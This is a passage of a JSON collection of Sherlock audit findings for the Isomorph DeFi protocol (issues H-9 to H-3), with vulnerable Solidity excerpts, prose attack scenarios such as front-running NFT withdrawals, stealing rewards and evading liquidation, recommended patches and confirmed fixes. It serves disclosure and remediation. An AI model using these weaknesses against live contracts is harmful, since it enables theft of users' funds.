      "title": "H-9: Swapping 100 tokens in DepositReceipt_ETH and DepositReciept_USDC breaks usage of WBTC LP and other high value tokens",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/46 \n\n## Found by \nclems4ever, 0x52\n\n## Summary\n\nDepositReceipt_ETH and DepositReciept_USDC checks the value of liquidity by swapping 100 tokens through the swap router. WBTC is a good example of a token that will likely never work as LP due to the massive value of swapping 100 WBTC. This makes DepositReceipt_ETH and DepositReciept_USDC revert during slippage checks after calculating amount out. As of the time of writing this, WETH also experiences a 11% slippage when trading 100 tokens. Since DepositReceipt_ETH only supports 18 decimal tokens, WETH/USDC would have to use DepositReciept_USDC, resulting in WETH/USDC being incompatible. The fluctuating liquidity could also make this a big issue as well. If liquidity reduces after deposits are made, user deposits could be permanently trapped. \n\n## Vulnerability Detail\n\n        //check swap value of 100tokens to USDC to protect against flash loan attacks\n        uint256 amountOut; //amount received by trade\n        bool stablePool; //if the traded pool is stable or volatile.\n        (amountOut, stablePool) = router.getAmountOut(HUNDRED_TOKENS, token1, USDC);\n\nThe above lines try to swap 100 tokens from token1 to USDC. In the case of WBTC 100 tokens is a monstrous amount to swap. Given the low liquidity on the network, it simply won't function due to slippage requirements.\n\n    function _priceCollateral(IDepositReceipt depositReceipt, uint256 _NFTId) internal view returns(uint256){  \n        uint256 pooledTokens = depositReceipt.pooledTokens(_NFTId);      \n        return( depositReceipt.priceLiquidity(pooledTokens));\n    }\n\n    function totalCollateralValue(address _collateralAddress, address _owner) public view returns(uint256){\n        NFTids memory userNFTs = loanNFTids[_collateralAddress][_owner];\n        IDepositReceipt depositReceipt = IDepositReceipt(_collateralAddress);\n        //slither-disable-next-line uninitialized-local-variables\n        uint256 totalPooledTokens;\n        for(uint256 i =0; i < NFT_LIMIT; i++){\n            //check if each slot contains an NFT\n            if (userNFTs.ids[i] != 0){\n                totalPooledTokens += depositReceipt.pooledTokens(userNFTs.ids[i]);\n            }\n        }\n        return(depositReceipt.priceLiquidity(totalPooledTokens));\n    }\n\nOne of the two functions above are used to price LP for every vault action on Vault_Velo. If liquidity is sufficient when user deposits but then drys up after, the users deposit would be permanently trapped in the in the vault. In addition to this liquidation would also become impossible causing the protocol to assume bad debt.\n\nThis could also be exploited by a malicious user. First they deposit a large amount of collateral into the Velodrome WBTC/USDC pair. They take a portion of their LP and take a loan against it. Now they withdraw the rest of their LP. Since there is no longer enough liquidity to swap 100 tokens with 5% slippage, they are now safe from liquidation, allowing a risk free loan.\n\n## Impact\n\nLPs that contain high value tokens will be unusable at best and freeze user funds or be abused at the worst case\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/DepositReceipt_ETH.sol#L93-L152\n\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/DepositReceipt_USDC.sol#L75-L130\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nChange the number of tokens to an immutable, so that it can be set individually for each token. Optionally you can add checks (shown below) to make sure that the number of tokens being swapped will result in at least some minimum value of USDC is received. Similar changes should be made for DepositReceipt_ETH:\n\n    constructor(string memory _name, \n                string memory _symbol, \n                address _router, \n                address _token0,\n                address _token1,\n                uint256 _tokensToSwap,\n                bool _stable,\n                address _priceFeed) \n                ERC721(_name, _symbol){\n\n        ...\n\n        if (keccak256(token0Symbol) == keccak256(USDCSymbol)){\n            require( IERC20Metadata(_token1).decimals() == 18, \"Token does not have 18dp\");\n\n    +       (amountOut,) = _router.getAmountOut(_tokensToSwap, token1, USDC);\n\n    +       //swapping tokens must yield at least 100 USDC\n    +       require( amountOut >= 1e8);\n    +       tokensToSwap = _tokensToSwap;\n        }\n        else\n        {   \n            bytes memory token1Symbol = abi.encodePacked(IERC20Metadata(_token1).symbol());\n            require( keccak256(token1Symbol) == keccak256(USDCSymbol), \"One token must be USDC\");\n            require( IERC20Metadata(_token0).decimals() == 18, \"Token does not have 18dp\");\n            \n    +       (amountOut, ) = _router.getAmountOut(_tokensToSwap, token0, USDC);\n\n    +       //swapping tokens must yield at least 100 USDC\n    +       require( amountOut >= 1e8);\n    +       tokensToSwap = _tokensToSwap;\n        }\n\n## Discussion\n\n**kree-dotcom**\n\nSponsor confirmed, will fix\n\n**kree-dotcom**\n\nFixed https://github.com/kree-dotcom/Velo-Deposit-Tokens/commit/76bb63d885759825d93e95925364806168d02e51\n\nBoth DepositReceipts have had the swap quantity changed to an immutable. DepositReceipt_USDC contains further checks to ensure the swap quantity would receive between 100 and 105 USDC on deployment so we know it is the right scale. This check could also be done with DepositReceipt_ETH but because the value of ETH is dynamic it would be a little more complex so instead we just included a non-zero value check. \n\nSorry, corrected a mistake with still using the `HUNDRED` constant for scaling this trade\nhttps://github.com/kree-dotcom/Velo-Deposit-Tokens/commit/d8e7651f44a4cee07d23c00aa6ee612e25879771",
      "summary": "\nThis bug report is about DepositReceipt_ETH and DepositReciept_USDC, which are smart contracts used to check the value of liquidity. These contracts check the value by swapping 100 tokens through the swap router. However, for tokens with high value such as WBTC, swapping 100 tokens is a monstrous amount and may not be possible due to slippage requirements. This could lead to user deposits being trapped and liquidation becoming impossible, causing the protocol to assume bad debt. It can also be exploited by malicious users to take a risk free loan. \n\nThe code snippets provided in the report show the functions used to price LP for every vault action on Vault_Velo. The recommendation section suggests changing the number of tokens to an immutable, so that it can be set individually for each token. Additionally, checks can be added to make sure that the number of tokens being swapped will result in at least some minimum value of USDC is received. \n\nThe sponsor confirmed the bug and has since fixed it. The fixes include changing the swap quantity to an immutable and adding checks to ensure the swap quantity would receive between 100 and 105 USDC on deployment.",
      "quality_score": 5,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Isomorph",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/46",
      "tags": [
        "Decimals",
        "Business Logic"
      ],
      "finders": [
        "clems4ever",
        "0x52"
      ]
    },
    {
      "id": "5691",
      "title": "H-8: Anyone can withdraw user's Velo Deposit NFT after approval is given to depositor",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/47 \n\n## Found by \nclems4ever, bin2chen, ak1, neumo, CodingNameKiki, HollaDieWaldfee, rotcivegaf, Jeiwan, 0x52, HonorLt\n\n## Summary\n\n`Depositor#withdrawFromGauge` is a public function that can be called by anyone which transfers token to `msg.sender`. `withdrawFromGauge` burns the NFT to be withdrawn, which means that `Depositor` must either be approved or be in possession of the NFT. Since it doesn't transfer the NFT to the contract before burning the user must either send the NFT to the `Depositor` or `approve` the `Depositor` in a separate transaction. After the NFT is either transferred or approved, a malicious user could withdraw the NFT for themselves.\n\n## Vulnerability Detail\n\n    function withdrawFromGauge(uint256 _NFTId, address[] memory _tokens)  public  {\n        uint256 amount = depositReceipt.pooledTokens(_NFTId);\n        depositReceipt.burn(_NFTId);\n        gauge.getReward(address(this), _tokens);\n        gauge.withdraw(amount);\n        //AMMToken adheres to ERC20 spec meaning it reverts on failure, no need to check return\n        //slither-disable-next-line unchecked-transfer\n        AMMToken.transfer(msg.sender, amount);\n    }\n\n`Depositor#withdrawFromGauge` allows anyone to call it, burning the NFT and sending `msg.sender` the withdrawn tokens.\n\n    function burn(uint256 _NFTId) external onlyMinter{\n        require(_isApprovedOrOwner(msg.sender, _NFTId), \"ERC721: caller is not token owner or approved\");\n        delete pooledTokens[_NFTId];\n        delete relatedDepositor[_NFTId];\n        _burn(_NFTId);\n    }\n\n`Depositor` calls `DepositReceipt_Base#burn`, which means that it must be either the owner or approved for the NFT. Since \n`Depositor#withdrawFromGauge` doesn't transfer the NFT from the user, this must happen in a separate transaction. Between the user approval/transfer and them calling `Depositor#withdrawFromGauge` a malicious user could call `Depositor#withdrawFromGauge` first to withdraw the NFT and steal the users funds. This would be very easy to automate with a bot.\n\nExample:\n`User A` deposits 100 underlying into their `Depositor` and is given `Token A` which represents their deposit. After some time they want to redeem `Token A` so they `Approve` their `Depositor` for `Token A`. `User B` sees the approval and quickly calls `Depositor#withdrawFromGauge` to withdraw `Token A`. `User B` is sent the 100 tokens and `Token A` is burned from `User A`.\n\n## Impact\n\nUsers attempting to withdraw can have their funds stolen\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/Depositor.sol#L119-L127\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nOnly allow owner of NFT to withdraw it:\n\n        function withdrawFromGauge(uint256 _NFTId, address[] memory _tokens)  public  {\n    +       require(depositReceipt.ownerOf(_NFTId) == msg.sender);\n            uint256 amount = depositReceipt.pooledTokens(_NFTId);\n            depositReceipt.burn(_NFTId);\n            gauge.getReward(address(this), _tokens);\n            gauge.withdraw(amount);\n            //AMMToken adheres to ERC20 spec meaning it reverts on failure, no need to check return\n            //slither-disable-next-line unchecked-transfer\n            AMMToken.transfer(msg.sender, amount);\n        }\n\n## Discussion\n\n**kree-dotcom**\n\nSponsor Confirmed, will fix\n\n**kree-dotcom**\n\nFixed https://github.com/kree-dotcom/Velo-Deposit-Tokens/commit/23ff5653b555b11c9f4dead7ff5a72d50eac5788\n\nHere we have added a check on line 81 and 122 as suggested. There is also minor refactoring which is needed due to the fact if we are doing a partial withdrawal then after calling `depositReceipt.split()` the owner of the newly acquired depositReceipt is the Depositor not the original msg.sender. Therefore we moved the withdrawal logic to an internal function that both `withdrawFromGauge()` and `partialWithdrawFromGauge()` both access after ownership checks.",
      "summary": "\nThis bug report discusses an issue found in the code of the Velo Deposit NFT (Non-Fungible Token) where anyone can withdraw a user's Velo Deposit NFT after approval is given to the depositor. This vulnerability is due to the fact that the public function `Depositor#withdrawFromGauge` can be called by anyone, burning the NFT and sending the withdrawn tokens to `msg.sender`. The `Depositor` must either be approved or be in possession of the NFT, however since it doesn't transfer the NFT to the contract before burning, a malicious user could withdraw the NFT for themselves. This would be very easy to automate with a bot, resulting in users attempting to withdraw having their funds stolen. \n\nThe bug was found by clems4ever, bin2chen, ak1, neumo, CodingNameKiki, HollaDieWaldfee, rotcivegaf, Jeiwan, 0x52, HonorLt and was fixed by adding a check on line 81 and 122. This check ensures that only the owner of the NFT can withdraw it, preventing malicious users from stealing funds. There was also minor refactoring done to ensure that after calling `depositReceipt.split()`, the owner of the newly acquired depositReceipt is the Depositor and not the original `msg.sender`.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Isomorph",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/47",
      "tags": [
        "Front-Running"
      ],
      "finders": [
        "clems4ever",
        "HollaDieWaldfee",
        "0x52",
        "rotcivegaf",
        "Jeiwan",
        "bin2chen",
        "CodingNameKiki",
        "HonorLt",
        "ak1",
        "neumo"
      ]
    },
    {
      "id": "5690",
      "title": "H-7: User can steal rewards from other users by withdrawing their Velo Deposit NFTs from other users' depositors",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/51 \n\n## Found by \n0x52, HollaDieWaldfee\n\n## Summary\n\nRewards from staking AMM tokens accumulate to the depositor used to deposit them. The rewards accumulated by a depositor are passed to the owner when they claim. A malicious user to steal the rewards from other users by manipulating other users depositors. Since any NFT of a DepositReceipt can be withdrawn from any depositor with the same DepositReceipt, a malicious user could mint an NFT on their depositor then withdraw in from another user's depositor. The net effect is that that the victims deposits will effectively be in the attackers depositor and they will collect all the rewards.\n\n## Vulnerability Detail\n\n    function withdrawFromGauge(uint256 _NFTId, address[] memory _tokens)  public  {\n        uint256 amount = depositReceipt.pooledTokens(_NFTId);\n        depositReceipt.burn(_NFTId);\n        gauge.getReward(address(this), _tokens);\n        gauge.withdraw(amount);\n        //AMMToken adheres to ERC20 spec meaning it reverts on failure, no need to check return\n        //slither-disable-next-line unchecked-transfer\n        AMMToken.transfer(msg.sender, amount);\n    }\n\nEvery user must create a `Depositor` using `Templater` to interact with vaults and take loans. `Depositor#withdrawFromGauge` allows any user to withdraw any NFT that was minted by the same `DepositReciept`. This is where the issues arises. Since rewards are accumulated to the `Depositor` in which the underlying is staked a user can deposit to their `Depositor` then withdraw their NFT through the `Depositor` of another user's `Depositor` that uses the same `DepositReciept`. The effect is that the tokens will remained staked to the attackers `Depositor` allowing them to steal all the other user's rewards.\n\nExample:\n`User A` and `User B` both create a `Depositor` for the same `DepositReciept`. Both users deposit 100 tokens into their respective `Depositors`. `User B` now calls `withdrawFromGauge` on `Depositor A`. `User B` gets their 100 tokens back and `Depositor B` still has 100 tokens deposited in it. `User B` cannot steal these tokens but they are now collecting the yield on all 100 tokens via `Depositor B` and `User A` isn't getting any rewards at all because `Depositor A` no longer has any tokens deposited into Velodrome gauge.\n\n## Impact\n\nMalicious user can steal other user's rewards\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/Depositor.sol#L119-L127\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nDepositors should only be able to burn NFTs that they minted. Change DepositReciept_Base#burn to enforce this:\n\n        function burn(uint256 _NFTId) external onlyMinter{\n    +       //tokens must be burned by the depositor that minted them\n    +       address depositor = relatedDepositor[_NFTId];\n    +       require(depositor == msg.sender, \"Wrong depositor\");\n            require(_isApprovedOrOwner(msg.sender, _NFTId), \"ERC721: caller is not token owner or approved\");\n            delete pooledTokens[_NFTId];\n            delete relatedDepositor[_NFTId];\n            _burn(_NFTId);\n        }\n\n\n## Discussion\n\n**kree-dotcom**\n\nSponsor confirmed, will fix. Appears to be a duplicate of issue #43 's footnote.\n\n**kree-dotcom**\n\nFixed https://github.com/kree-dotcom/Velo-Deposit-Tokens/commit/23ff5653b555b11c9f4dead7ff5a72d50eac5788\n\nWe have taken a different approach to that suggested by the auditor, theirs looked valid though. \nWe added the checks on lines 82 and 123 that validate any depositReceipt being withdrawn was originally minted by that Depositor contract. Other lines changed in this commit relate to #47 .",
      "summary": "\nThis bug report discusses an issue where a malicious user can steal rewards from other users by withdrawing their Velo Deposit NFTs from other users' depositors. This vulnerability exists because the `Depositor#withdrawFromGauge` allows any user to withdraw any NFT that was minted by the same `DepositReciept`. This means that a malicious user can deposit to their `Depositor` then withdraw their NFT through the `Depositor` of another user's `Depositor` that uses the same `DepositReciept`. The net effect is that the tokens will remained staked to the attackers `Depositor` allowing them to steal all the other user's rewards. To fix this issue, the code was changed to add checks on lines 82 and 123 that validate any depositReceipt being withdrawn was originally minted by that Depositor contract.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Isomorph",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/51",
      "tags": [
        "Business Logic",
        "Access Control"
      ],
      "finders": [
        "HollaDieWaldfee",
        "0x52"
      ]
    },
    {
      "id": "5689",
      "title": "H-6: Outstanding loans cannot be closed or liquidated if collateral is paused",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/57 \n\n## Found by \n0x52, HonorLt\n\n## Summary\n\nWhen a collateral is paused by governance, `collateralValid` is set to false. This causes closing and liquidating of loans to be impossible, leading to two issues. The first is that users with exist loans are unable to close their loans to recover their collateral. The second is that since debt is impossible to liquidate the protocol could end up being stuck with a lot of bad debt.\n\n## Vulnerability Detail\n\n    function pauseCollateralType(\n        address _collateralAddress,\n        bytes32 _currencyKey\n        ) external collateralExists(_collateralAddress) onlyAdmin {\n        require(_collateralAddress != address(0)); //this should get caught by the collateralExists check but just to be careful\n        //checks two inputs to help prevent input mistakes\n        require( _currencyKey == collateralProps[_collateralAddress].currencyKey, \"Mismatched data\");\n        collateralValid[_collateralAddress] = false;\n        collateralPaused[_collateralAddress] = true;\n    }\n\nWhen a collateral is paused `collateralValid[_collateralAddress]` is set to `false`. For `Vault_Lyra` `Vault_Synths` and `Vault_Velo` this will cause `closeLoan` and `callLiquidation` to revert. This traps existing users and prevents liquidations which will result in bad debt for the protocol\n\n## Impact\n\nOutstanding loans cannot be closed or liquidated, freezing user funds and causing the protocol to take on bad debt\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/CollateralBook.sol#L185-L195\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAllow liquidations and loan closure when collateral is paused\n\n## Discussion\n\n**kree-dotcom**\n\nSponsor confirmed, will fix. We will make it possible to close a loan or liquidate a loan when the collateral is paused.\n\n**kree-dotcom**\n\nFixed. https://github.com/kree-dotcom/isomorph/commit/9fef84211c150a6d184b2c492f77fa13b8adc61b \n\nBy decoupling the switching of the CollateralValid mapping in the `CollateralBook.sol` from CollateralPaused we can now introduce an additional check in `OpenLoan()` of `require(!collateralBook.collateralPaused(_collateralAddress), \"Paused collateral!\");` \nThis means `increaseCollateralAmount()`, `closeLoan()` and `callLiquidation()` can all occur for paused collaterals.",
      "summary": "\nThis bug report concerns the issue of loans not being able to be closed or liquidated if the collateral for them is paused. This is because when the collateral is paused, the variable `collateralValid` is set to false, which causes `closeLoan` and `callLiquidation` to revert. This means that users with existing loans are unable to close their loans to recover their collateral, and the protocol could end up stuck with a lot of bad debt.\n\nThe code snippet that was used to identify the issue can be found at https://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/CollateralBook.sol#L185-L195. The tool used to find this issue was manual review.\n\nThe recommendation to fix this issue was to allow liquidations and loan closure when collateral is paused. This was done by decoupling the switching of `CollateralValid` mapping in the `CollateralBook.sol` from `CollateralPaused` and introducing an additional check in `OpenLoan()` of `require(!collateralBook.collateralPaused(_collateralAddress), \"Paused collateral!\");`. This means that `increaseCollateralAmount()`, `closeLoan()` and `callLiquidation()` can all occur for paused collaterals.",
      "quality_score": 3.9998052549991043,
      "rarity_score": 3.000389490001792,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Isomorph",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/57",
      "tags": [
        "DOS",
        "Change Validation"
      ],
      "finders": [
        "HonorLt",
        "0x52"
      ]
    },
    {
      "id": "5688",
      "title": "H-5: Users are unable close or add to their Lyra vault positions when price is stale or circuit breaker is tripped",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/69 \n\n## Found by \n0x52, rvierdiiev\n\n## Summary\n\nUsers are unable close or add to their Lyra vault positions when price is stale or circuit breaker is tripped. This is problematic for a few reasons. First is that the circuit breaker can be tripped indefinitely which means their collateral could be frozen forever and they will be accumulating interest the entire time they are frozen. The second is that since they can't add any additional collateral to their loan, the loan may end up being underwater by the time the price is no longer stale or circuit breaker is no longer tripped. They may have wanted to add more assets and now they are liquidated, which is unfair as users who are liquidated are effectively forced to pay a fee to the liquidator.\n\n## Vulnerability Detail\n\n    function _checkIfCollateralIsActive(bytes32 _currencyKey) internal view override {\n            \n             //Lyra LP tokens use their associated LiquidityPool to check if they're active\n             ILiquidityPoolAvalon LiquidityPool = ILiquidityPoolAvalon(collateralBook.liquidityPoolOf(_currencyKey));\n             bool isStale;\n             uint circuitBreakerExpiry;\n             //ignore first output as this is the token price and not needed yet.\n             (, isStale, circuitBreakerExpiry) = LiquidityPool.getTokenPriceWithCheck();\n             require( !(isStale), \"Global Cache Stale, can't trade\");\n             require(circuitBreakerExpiry < block.timestamp, \"Lyra Circuit Breakers active, can't trade\");\n    }\n\nThe above lines are run every time a user a user tries to interact with the vault. Currently this is overly restrictive and can lead to a lot of undesired situations, as explained in the summary.\n\n## Impact\n\nFrozen assets, unfair interest accumulation and unfair liquidations\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/Vault_Lyra.sol#L45-L55\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThe contract is frozen when price is stale or circuit breaker is tripped to prevent price manipulation. While it should restrict a majority of actions there are a two that don't need any price validation. If a user wishes to close out their entire loan then there is no need for price validation because the user has no more debt and therefore doesn't need to maintain any level of collateralization. The other situation is if a user adds collateral to their vault and doesn't take out any more loans. In this scenario, the collateralization can only increase, which means that price validation is not necessary.\n\nI recommend the following changes to closeLoan:\n\n    -   _checkIfCollateralIsActive(currencyKey);\n        uint256 isoUSDdebt = (isoUSDLoanAndInterest[_collateralAddress][msg.sender] * virtualPrice) / LOAN_SCALE;\n        require( isoUSDdebt >= _USDToVault, \"Trying to return more isoUSD than borrowed!\");\n        uint256 outstandingisoUSD = isoUSDdebt - _USDToVault;\n        if(outstandingisoUSD >= TENTH_OF_CENT){ //ignore leftover debts less than $0.001\n    +       //only need to check collateral value if user has remaining debt\n    +       _checkIfCollateralIsActive(currencyKey);\n            uint256 collateralLeft = collateralPosted[_collateralAddress][msg.sender] - _collateralToUser;\n            uint256 colInUSD = priceCollateralToUSD(currencyKey, collateralLeft); \n            uint256 borrowMargin = (outstandingisoUSD * minOpeningMargin) / LOAN_SCALE;\n            require(colInUSD > borrowMargin , \"Remaining debt fails to meet minimum margin!\");\n        }\n\nI recommend removing liquidation threshold check from increaseCollateralAmount:\n\n        //debatable check begins here \n    -   uint256 totalCollat = collateralPosted[_collateralAddress][msg.sender] + _colAmount;\n    -   uint256 colInUSD = priceCollateralToUSD(currencyKey, totalCollat);\n    -   uint256 USDborrowed = (isoUSDLoanAndInterest[_collateralAddress][msg.sender] * virtualPrice) / LOAN_SCALE;\n    -   uint256 borrowMargin = (USDborrowed * liquidatableMargin) / LOAN_SCALE;\n    -   require(colInUSD >= borrowMargin, \"Liquidation margin not met!\");\n        //debatable check ends here\n\n## Discussion\n\n**kree-dotcom**\n\nSponsor confirmed, will fix. \nThe liquidation threshold for `increaseCollateralAmount()` has been removed as part of the fix for issue #229\n\nWill update when the closeLoan check has been improved.\n\n**kree-dotcom**\n\n`closeLoan()` fixed here https://github.com/kree-dotcom/isomorph/commit/c14410687e0f2095dd9103b00157b8784430875e",
      "summary": "\nIssue H-5 is a bug that prevents users from closing or adding to their Lyra vault positions when the price is stale or circuit breaker is tripped. This can lead to a few problems, such as frozen assets and unfair liquidations. The code snippet that is causing this issue can be found at https://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/Vault_Lyra.sol#L45-L55. This was found through manual review.\n\nThe impact of this bug is frozen assets, unfair interest accumulation and unfair liquidations. The recommendation is to make changes to the closeLoan and increaseCollateralAmount functions of the code, such as removing the liquidation threshold check from increaseCollateralAmount and adding a condition to closeLoan that only needs to check collateral value if the user has remaining debt. The sponsor has confirmed the fix and updated the code accordingly.",
      "quality_score": 5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Isomorph",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/69",
      "tags": [
        "Stale Price",
        "Liquidation"
      ],
      "finders": [
        "rvierdiiev",
        "0x52"
      ]
    },
    {
      "id": "5687",
      "title": "H-4: Malicious user can DOS pool and avoid liquidation by creating secondary liquidity pool for Velodrome token pair",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/72 \n\n## Found by \n0x52\n\n## Summary\n\nFor every Vault_Velo interaction the vault attempts to price the liquidity of the user. This calls priceLiquidity in the corresponding DepsoitReciept. The prices the underlying assets by swapping them through the Velodrome router. Velodrome can have both a stable and volatile pool for each asset pair. When calling the router directly it routes through the pool that gives the best price. In priceLiquidity the transaction will revert if the router routes through the wrong pool (i.e. trading the volatile pool instead of the stable pool). A malicious user can use this to their advantage to avoid being liquidated.  They could manipulate the price of the opposite pool so that any call to liquidate them would route through the wrong pool and revert.\n\n## Vulnerability Detail\n\n        uint256 amountOut; //amount received by trade\n        bool stablePool; //if the traded pool is stable or volatile.\n        (amountOut, stablePool) = router.getAmountOut(HUNDRED_TOKENS, token1, USDC);\n        require(stablePool == stable, \"pricing occuring through wrong pool\" );\n\nDepositReceipt uses the getAmountOut call the estimate the amountOut. The router will return the best rate between the volatile and stable pool. If the wrong pool give the better rate then the transaction will revert. Since pricing is called during liquidation, a malicious user could manipulate the price of the wrong pool so that it returns the better rate and always reverts the liquidation call.\n\n## Impact\n\nMalicious user can avoid liquidation\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/DepositReceipt_USDC.sol#L75-L130\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nInstead of quoting from the router, query the correct pool directly:\n\n            uint256 amountOut; //amount received by trade\n    -       bool stablePool; //if the traded pool is stable or volatile.\n\n    -       (amountOut, stablePool) = router.getAmountOut(HUNDRED_TOKENS, token1, USDC);\n    -       require(stablePool == stable, \"pricing occuring through wrong pool\" );\n    +       address pair;\n\n    +       pair = router.pairFor(token1, USDC, stable)\n    +       amountOut = IPair(pair).getAmountOut(HUNDRED_TOKENS, token1)\n\n## Discussion\n\n**kree-dotcom**\n\nSponsor confirmed, will fix.\n\n**kree-dotcom**\n\nFixed https://github.com/kree-dotcom/Velo-Deposit-Tokens/commit/58b8f3e14b416630971b7b17b500bbe22d2016aa\n\nNote there are two fixes in this commit relating to the priceLiquidity function. The other fix is for issue #145 , the code for these changes doesn't overlap so should be clear, please ask me if it is not.",
      "summary": "\nThis bug report is about a vulnerability found in the Velodrome token pair on the Velo deposit tokens contract. The issue is that a malicious user can avoid liquidation by creating a secondary liquidity pool. This is done by calling the priceLiquidity function in the corresponding DepositReceipt. This function calls the router, which will return the best rate between the volatile and stable pool. If the wrong pool gives the better rate, then the transaction will revert. A malicious user can manipulate the price of the opposite pool so that any call to liquidate them will route through the wrong pool and revert. This would enable them to avoid liquidation.\n\nThe code snippet provided in the report shows the code of the priceLiquidity function which is vulnerable to this malicious user. The recommendation given is to query the correct pool directly instead of quoting from the router. This was confirmed by the sponsor and fixed in a commit on GitHub.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Isomorph",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/72",
      "tags": [
        "Liquidation",
        "DOS",
        "Denial-Of-Service"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "5686",
      "title": "H-3: Users who deposit Lyra LP as collateral will lose OP vault rewards",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/78 \n\n## Found by \n0x52\n\n## Summary\n\nOptimism currently offers yield farming opportunities for Lyra LPs, see [OP Reward Announcement](https://blog.lyra.finance/incentives-launch/). Every 2 weeks Lyra LPs split a claimable pool. When they use their Lyra LP as collateral, it is transferred to the Lyra vault which means that all OP will be instead claimable by the vault. The vault currently doesn't implement any method to claim or distribute those tokens. The result is a loss of user yield on their Lyra tokens. Aside from the loss of funds, it also highly disincentivizes users from using Lyra tokens as collateral.\n\n## Vulnerability Detail\n\nSee summary.\n\n## Impact\n\nLyra LPs that use their tokens as collateral will lose all their OP rewards\n\n## Code Snippet\n\n[Vault_Lyra.sol](https://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/Vault_Lyra.sol#L1)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nIt's unclear how long OP rewards will continue but it seems like other protocols have been getting 6 months of incentives. Since they are temporary I would recommend not integrating reward distribution directly into the contract. I would recommend adding a function to claim rewards to the Isomorph treasury. After the rewards end, the Isomorph should create an airdrop to distribute those tokens to users during that period of time.\n\n## Discussion\n\n**kree-dotcom**\n\nSponsor confirmed, will fix",
      "summary": "\nA bug report has been found on the code snippet of Vault_Lyra.sol which is part of the Isomorph project. This bug is causing users of Lyra tokens to lose their OP vault rewards when they deposit their tokens as collateral. This is happening because the vault doesn't have any method to claim or distribute the rewards and users are being highly disincentivized from using Lyra tokens as collateral. The impact of this bug is that Lyra LPs that use their tokens as collateral will lose all their OP rewards. \n\nThe recommendation is that since OP rewards are temporary, the Isomorph should not integrate reward distribution directly into the contract. Instead, a function should be added to claim rewards to the Isomorph treasury. After the rewards end, the Isomorph should create an airdrop to distribute those tokens to users during that period of time. The sponsor has confirmed to fix this issue.",
      "quality_score": 5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Isomorph",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/78",
      "tags": [
        "External Contract"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "5685",
      "title": "H-2: The calculation of ````totalUSDborrowed```` in ````openLoan()```` is not correct",
      "impact": "HIGH",
